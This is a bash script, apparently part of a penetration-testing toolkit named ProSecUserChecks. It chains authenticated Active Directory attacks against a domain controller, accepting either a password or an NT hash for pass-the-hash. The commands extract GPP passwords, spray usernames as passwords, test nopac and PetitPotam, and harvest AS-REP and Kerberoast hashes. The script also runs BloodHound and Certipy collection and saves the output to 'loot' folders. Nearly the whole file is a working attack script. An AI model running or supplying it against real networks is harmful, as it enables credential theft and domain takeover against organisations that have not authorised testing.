 #!/bin/bash
figlet -w 84 ProSecUserChecks
echo "v0.5"
echo "CME is still buggy u need to press ENTER sometimes!"
unset USER HASH PASS DOM IP FQDN

show_help () {
echo "HINT: Special Characters should be escaped better use ''"
echo "DNS must be working for bloodhound!"
echo ""
echo "Options:"
echo "  -u              Username -> Required"
echo "  -p              Password -> provide pass OR nthash"
echo "  -H              NT Hash -> provide pass OR nthash"
echo "  -d              domain -> required"
echo "  -i             IP Domain Controller -> required"
echo "  -h              this help"
exit 0
}

OPTIND=1
while getopts u:p:H:d:i: opt
do
    case "$opt" in
        (u)
          USER=${OPTARG}
        ;;
        (p)
          PASS=${OPTARG}
        ;;
        (H)
          HASH=${OPTARG}
        ;;
        (d)
          DOM=${OPTARG}
        ;;
        (i)
          IP=${OPTARG}
        ;;
        (u|p|H|d|i)
          shift 2
          OPTIND=1
        ;;
        (*)
          show_help
        ;;
    esac
done

shift "$((OPTIND - 1))"
[ "$1" = "--" ] && shift

if [ -z $USER ]
then 
    show_help
fi
if [ -z $IP ]
then 
    show_help
fi
if [ -z $DOM ]
then 
    show_help
fi

# get DC_FQDN
FQDN=$(nslookup $IP | awk '// {print$4}' | sed 's/.$//')

if [ -z $HASH ]
then
 # Use Password
  export PYTHONUNBUFFERED=TRUE
  echo "GPP_Password" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # GPP password
   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt

  echo "GPP_Autologin" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # GPP autologin
   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt

  echo "Username_as_pass" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # User txt from DC
   crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
   awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' > /root/output/list/user.txt
   rm /root/output/list/raw.txt
   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
   grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
 # keep the raw file for screens and debugging
   # BH owned User
   BHDOM=${DOM^^}
   awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt | cut -d : -f 2 | sort -u | tr [:lower:] [:upper:] > /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt
   for i in $(cat /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt); do echo "MATCH (n) WHERE n.name = '$i@$BHDOM' SET n.owned=true RETURN n;" >> /root/output/loot/intern/ad/iam/username_as_pass/bh_owned.txt ; done

  echo "Pass-Pol" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # Password policy
   crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol >> /root/output/loot/intern/ad/passpol/pol_$DOM.txt

  echo "nopac" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # nopac
   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac >> /root/output/loot/intern/ldap/nopac/nopac_$FQDN.txt

  echo "Petit Potam" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # petitpotam
   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam/petitpotam_$FQDN.txt

  echo "Sessions" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # sessions
   crackmapexec smb /root/output/list/smb_open.txt -u $USER -p $PASS -d $DOM --sessions >> /root/output/loot/intern/ad/session/sessions_$DOM.txt

  echo "ASRep" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # asreproast
   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt --kdcHost $FQDN

  echo "Kerberoast" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # kerberoast
   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt --kdcHost $FQDN

  echo "MAQ" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # MAQ  
   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt --kdcHost $FQDN

  echo "LDAP Signing" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # ldap signing 
   python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH >> /root/output/loot/intern/ldap/signing/signig_$DOM.txt

  echo "Bloodhound + Certipy OLD" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # bloodhound
   bloodhound-python -u $USER -p $PASS -d $DOM -dc $FQDN -w 50 -c all --zip
   certipy find -u $USER -p $PASS -target $IP -old-bloodhound
   mv *.zip /root/output/loot/intern/ad

#Python unbuffered reset to default
unset PYTHONUNBUFFERED   
  echo "Userchecks Done" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
exit 0
fi

if [ -z $PASS ]
then
 # use HASH
 export PYTHONUNBUFFERED=TRUE
  echo "GPP_Password" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # GPP password
   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt

  echo "GPP_Autologin" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # GPP autologin
   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt

  echo "Username_as_pass" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # User txt from DC
   crackmapexec smb $IP -u $USER -H $HASH -d $DOM --users > /root/output/list/raw.txt
   awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' > /root/output/list/user.txt
   rm /root/output/list/raw.txt
   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
   grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
 # keep the raw file for screens and debugging
   # BH owned User
   BHDOM=${DOM^^}
   awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt | cut -d : -f 2 | sort -u | tr [:lower:] [:upper:] > /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt
   for i in $(cat /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt); do echo "MATCH (n) WHERE n.name = '$i@$BHDOM' SET n.owned=true RETURN n;" >> /root/output/loot/intern/ad/iam/username_as_pass/bh_owned.txt ; done

  echo "Pass-Pol" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # Password policy
   crackmapexec smb $IP -u $USER -H $HASH -d $DOM --pass-pol >> /root/output/loot/intern/ad/passpol/pol_$DOM.txt

  echo "nopac" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # nopac
   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M nopac >> /root/output/loot/intern/ldap/nopac/nopac_$FQDN.txt

  echo "Petit Potam" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # petitpotam
   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam/petitpotam_$FQDN.txt

  echo "Sessions" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # sessions
   crackmapexec smb /root/output/list/smb_open.txt -u $USER -H $HASH -d $DOM --sessions >> /root/output/loot/intern/ad/session/sessions_$FQDN.txt

  echo "ASRep" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # asreproast
   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt --kdcHost $FQDN

  echo "Kerberoast" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # kerberoast
   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt --kdcHost $FQDN

  echo "MAQ" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # MAQ  
   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt --kdcHost $FQDN

  echo "LDAP Signing" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # ldap signing
   python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -nthash $HASH -dc-ip $IP -method BOTH > /root/output/loot/intern/ldap/signing/signig_$DOM.txt

  echo "Bloodhound + Certipy OLD" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
 # bloodhound
   bloodhound-python -u $USER --hashes aad3b435b51404eeaad3b435b51404ee:$HASH -d $DOM -dc $FQDN -w 50 -c all --zip
   certipy find -u $USER -hashes $HASH -target $IP -old-bloodhound
   mv *.zip /root/output/loot/intern/ad
#Python unbuffered reset to default
unset PYTHONUNBUFFERED
  echo "Userchecks Done" >> /root/output/runtime.txt
  date >> /root/output/runtime.txt
exit 0    
fi
exit 0
